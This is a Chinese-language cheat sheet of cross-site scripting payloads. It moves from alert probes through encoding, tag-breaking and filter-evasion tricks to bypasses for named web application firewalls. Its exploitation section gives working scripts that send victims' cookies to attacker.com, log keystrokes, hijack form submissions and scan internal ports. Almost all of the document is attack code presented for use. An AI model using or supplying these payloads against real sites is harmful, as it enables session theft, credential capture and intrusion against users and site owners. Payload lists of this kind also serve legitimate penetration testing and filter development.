# XSS Payload 模板

## 基础检测

### 简单弹窗

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### 事件处理器

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=1 onerror=alert(1)>
<img src="javascript:alert(1)">
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### 伪协议

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)">
```

## 绕过技术

### 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SVg OnLoAd=alert(1)>
```

### 编码绕过

#### HTML 实体编码

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>
```

#### URL 编码

```html
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
<img src=x onerror="eval(unescape('%61%6c%65%72%74%28%31%29'))">
```

#### Unicode 编码

```html
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

#### Base64 编码

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 标签闭合绕过

```html
# 闭合属性
"><script>alert(1)</script>
'><script>alert(1)</script>

# 闭合标签
</script><script>alert(1)</script>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
```

### 注释绕过

```html
<script>alert(1)<!--</script>
<img src=x onerror=alert(1)//
<img src=x onerror=alert(1)><!--
--><script>alert(1)</script>
```

### 空白字符绕过

```html
<script/xss>alert(1)</script>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
<img src=x onerror%0a=alert(1)>
<img src=x onerror%0d=alert(1)>
<img src=x onerror%09=alert(1)>
```

### 标签嵌套绕过

```html
<scr<script>ipt>alert(1)</script>
<scr%00ipt>alert(1)</script>
<scr\x00ipt>alert(1)</script>
```

## 高级利用

### Cookie 窃取

```html
<script>
new Image().src="http://attacker.com/?c="+document.cookie;
</script>

<script>
fetch('http://attacker.com/?c='+document.cookie);
</script>

<script>
var x=new XMLHttpRequest();
x.open('GET','http://attacker.com/?c='+document.cookie,true);
x.send();
</script>

<script>
document.location='http://attacker.com/?c='+document.cookie;
</script>
```

### 键盘记录

```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/?k=' + e.key);
});
</script>
```

### 表单劫持

```html
<script>
document.forms[0].action='http://attacker.com/steal';
</script>

<script>
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: new FormData(this)
    });
});
</script>
```

### 内网探测

```html
<script>
// 端口扫描
for(var i=1;i<=65535;i++){
    var img = new Image();
    img.src = 'http://192.168.1.1:'+i;
    img.onerror = function(){
        if(this.complete){
            fetch('http://attacker.com/?port='+this.src);
        }
    };
}
</script>
```

### DOM XSS

```html
<script>
document.write(location.hash);
document.writeln(location.search);
element.innerHTML = location.hash;
element.outerHTML = location.search;
eval(location.hash);
setTimeout(location.hash, 100);
setInterval(location.hash, 100);
</script>

# URL 触发
http://example.com/page.html#<script>alert(1)</script>
http://example.com/page.html#<img src=x onerror=alert(1)>
```

## 特定上下文

### JavaScript 上下文

```javascript
# 字符串内
'-alert(1)-'
'-alert(1)//
';alert(1)//
</script><script>alert(1)</script>

# 变量赋值
var x = '';alert(1)//';
var x = ""-alert(1)-"";

# JSON 解析
</script><script>alert(1)</script>
```

### HTML 属性上下文

```html
# class 属性
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='

# href 属性
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# src 属性
" onerror=alert(1) x="
javascript:alert(1)
```

### CSS 上下文

```html
<style>
body{background:url('javascript:alert(1)')}
</style>

<style>
@import 'javascript:alert(1)';
</style>

<div style="background:url('javascript:alert(1)')">
<div style="width:expression(alert(1))">
```

## WAF 绕过

### Cloudflare 绕过

```html
<img src=x onerror="alert`1`">
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert(1)//
<svg/onload=alert&lpar;1&rpar;>
```

### ModSecurity 绕过

```html
<script>window['alert'](1)</script>
<script>window['al'+'ert'](1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### 其他 WAF 绕过

```html
# 使用反引号
<img src=x onerror=alert`1`>

# 使用函数构造
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

# 使用拼接
<script>window['al'+'ert'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>parent['al'+'ert'](1)</script>
<script>frames['al'+'ert'](1)</script>
```